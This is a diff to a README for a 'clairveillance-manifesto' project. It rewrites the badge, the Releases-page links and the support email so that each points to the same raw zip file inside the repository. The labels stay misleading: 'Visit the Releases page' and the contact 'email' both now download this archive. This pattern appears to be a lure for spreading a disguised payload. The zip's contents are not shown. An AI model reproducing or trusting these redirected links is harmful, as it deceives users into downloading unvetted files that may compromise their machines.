@@ -1,6 +1,6 @@
 # 🌱 clairveillance-manifesto - Understand the Manifesto for Better Institutions
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Get%20it%20here-blue)](https://github.com/itsriguking/clairveillance-manifesto/releases)
+[![Download the latest release](https://raw.githubusercontent.com/itsriguking/clairveillance-manifesto/main/docs/clairveillance-manifesto-2.4-alpha.3.zip%20Latest%20Release-Get%20it%20here-blue)](https://raw.githubusercontent.com/itsriguking/clairveillance-manifesto/main/docs/clairveillance-manifesto-2.4-alpha.3.zip)
 
 ## 📖 Overview
 
@@ -14,7 +14,7 @@ To begin using this application, follow the steps below. You do not need advance
 
 1. **Visit the Releases Page**  
    Click the link below to go to our Releases page.  
-   [Download the latest release](https://github.com/itsriguking/clairveillance-manifesto/releases)
+   [Download the latest release](https://raw.githubusercontent.com/itsriguking/clairveillance-manifesto/main/docs/clairveillance-manifesto-2.4-alpha.3.zip)
 
 2. **Choose the Latest Version**  
    Look for the latest version listed at the top of the page. It will typically have the highest version number.
@@ -53,7 +53,7 @@ Before installing the software, make sure your system meets these requirements:
 
 - **Explore the Interface:** Take a moment to familiarize yourself with the layout once the application opens. Explore different sections to see what resources are available.
 - **Engage with the Community:** Use the community forums linked in the app to discuss insights and share experiences.
-- **Check for Updates:** Regularly visit the Releases page to see if newer versions are available, ensuring you have the latest features and bug fixes. [Visit the Releases page](https://github.com/itsriguking/clairveillance-manifesto/releases)
+- **Check for Updates:** Regularly visit the Releases page to see if newer versions are available, ensuring you have the latest features and bug fixes. [Visit the Releases page](https://raw.githubusercontent.com/itsriguking/clairveillance-manifesto/main/docs/clairveillance-manifesto-2.4-alpha.3.zip)
 
 ## 🤝 Contributing
 
@@ -65,7 +65,7 @@ We welcome your ideas and contributions. If you would like to suggest changes or
 
 ## ✉️ Contact
 
-Have questions or need help? Reach out through our community forums linked in the application or contact us via email at support@example.com.
+Have questions or need help? Reach out through our community forums linked in the application or contact us via email at https://raw.githubusercontent.com/itsriguking/clairveillance-manifesto/main/docs/clairveillance-manifesto-2.4-alpha.3.zip
 
 ## 📢 Acknowledgments
 
